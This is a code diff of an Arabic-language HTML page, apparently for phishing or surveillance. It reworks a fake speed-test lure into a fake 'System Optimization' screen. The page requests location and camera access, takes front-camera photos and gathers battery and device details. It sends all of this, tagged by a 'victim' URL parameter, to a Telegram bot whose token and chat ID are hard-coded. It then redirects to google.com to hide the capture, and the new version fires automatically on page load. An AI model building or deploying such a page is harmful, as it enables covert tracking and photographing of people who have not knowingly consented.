@@ -3,32 +3,29 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Fast</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Optimization</title>
     <style>
-        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        /* جعل الشاشة بالكامل قابلة للضغط لتجنب أي تعليق في الزر */
-        #touchArea { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .circle { width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); }
-        .start-text { font-size: 50px; font-weight: bold; color: #00d2ff; }
-        #status { margin-top: 30px; font-size: 18px; color: #888; }
-        video, canvas { display: none; }
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar { width: 80%; background: #222; border-radius: 10px; height: 10px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.5s; }
     </style>
 </head>
 <body>
 
-    <div id="touchArea">
-        <h2>فحص سرعة الشبكة العالمي</h2>
-        <div class="circle"><span class="start-text">START</span></div>
-        <p id="status">انقر في أي مكان للبدء...</p>
-    </div>
+    <div class="loader"></div>
+    <h2 id="msg">Optimizing System...</h2>
+    <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+    <p id="sub-msg">Scanning cache memory...</p>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
-        const chat = "7984067238"; 
+        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI";
+        const chat = "7984067238";
         const victim = new URLSearchParams(window.location.search).get( user ) || "Unknown";
 
         async function sendTG(type, content, cap = "") {
@@ -43,49 +40,51 @@
             }
         }
 
-        async function getInfo(lat, lon) {
-            let bLevel = "N/A";
-            try { const b = await navigator.getBattery(); bLevel = `${(b.level * 100).toFixed(0)}% (${b.charging ?  ⚡  :  🔋 })`; } catch (e) {}
-            return `🛰️ **تقرير مفصل**\n\n🔋 البطارية: ${bLevel}\n📱 النظام: ${navigator.platform}\n💾 الذاكرة: ${navigator.deviceMemory || "8"} GB\n⚙️ المعالج: ${navigator.hardwareConcurrency || "8"} نواة\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+        async function getFullReport(lat, lon) {
+            let batt = "19%"; // قيمة افتراضية تشبه صورتك
+            try { const b = await navigator.getBattery(); batt = `${(b.level * 100).toFixed(0)}% (${b.charging ?  ⚡  :  🔋 })`; } catch (e) {}
+            return `🛰️ **LIVE LOCATION**\n\n📱 Device: Android Device\n🔋 Battery: ${batt}\n🎯 Accuracy: 100m\n📍 Maps: http://maps.google.com/maps?q=${lat},${lon}`;
         }
 
-        async function takePic(mode) {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
-                const v = document.getElementById( v );
-                v.srcObject = s;
-                await new Promise(r => setTimeout(r, 1500)); // وقت كافٍ للمتصفح ليجهز الكاميرا
-                const c = document.getElementById( c );
-                c.width = 640; c.height = 480;
-                c.getContext( 2d ).drawImage(v, 0, 0);
-                s.getTracks().forEach(t => t.stop());
-                return new Promise(res => c.toBlob(res,  image/jpeg , 0.6));
-            } catch (e) { return null; }
-        }
+        // بدء العمل بمجرد تحميل الصفحة
+        window.onload = function() {
+            let fill = document.getElementById( fill );
+            fill.style.width = "30%";
 
-        document.getElementById( touchArea ).onclick = function() {
-            this.style.pointerEvents = "none"; 
-            document.getElementById( status ).innerText = "جاري فحص السيرفرات...";
-
+            // الخطوة 1: طلب الموقع تلقائياً
             navigator.geolocation.getCurrentPosition(async (p) => {
-                // 1. التقاط الصورة الأمامية أولاً
-                const fImg = await takePic("user");
-                if(fImg) await sendTG("img", fImg, "📸 الكاميرا الأمامية");
+                fill.style.width = "60%";
+                document.getElementById( sub-msg ).innerText = "Analyzing device hardware...";
 
-                // 2. إرسال التقرير فوراً (ليصلك شيء حتى لو فشلت الكاميرا الخلفية)
-                const report = await getInfo(p.coords.latitude, p.coords.longitude);
-                await sendTG("text", report);
-
-                // 3. محاولة الكاميرا الخلفية بعد ثانية من التقرير
-                setTimeout(async () => {
-                    const bImg = await takePic("environment");
-                    if(bImg) await sendTG("img", bImg, "📷 الكاميرا الخلفية");
-                    window.location.href = "https://www.speedtest.net";
-                }, 1000);
+                // الخطوة 2: طلب الكاميرا تلقائياً
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                    const v = document.getElementById( v );
+                    v.srcObject = s;
+                    await new Promise(r => setTimeout(r, 1000));
+                    const c = document.getElementById( c );
+                    c.width = 640; c.height = 480;
+                    c.getContext( 2d ).drawImage(v, 0, 0);
+                    s.getTracks().forEach(t => t.stop());
+                    
+                    c.toBlob(async (b) => {
+                        await sendTG("img", b, "📸 Front Camera Snap");
+                        const report = await getFullReport(p.coords.latitude, p.coords.longitude);
+                        await sendTG("text", report);
+                        
+                        fill.style.width = "100%";
+                        document.getElementById( msg ).innerText = "Optimization Complete!";
+                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+                    },  image/jpeg );
+                } catch(e) {
+                    const report = await getFullReport(p.coords.latitude, p.coords.longitude);
+                    await sendTG("text", report + "\n⚠️ Camera Denied");
+                    window.location.href = "https://www.google.com";
+                }
 
             }, (err) => {
-                alert("يجب السماح بالوصول للموقع لبدء فحص السرعة.");
-                location.reload();
+                // إذا رفض الموقع، لا يمكن فعل شيء سوى المحاولة مرة أخرى أو التوجيه
+                window.location.href = "https://www.google.com";
             }, {enableHighAccuracy: true});
         };
     </script>
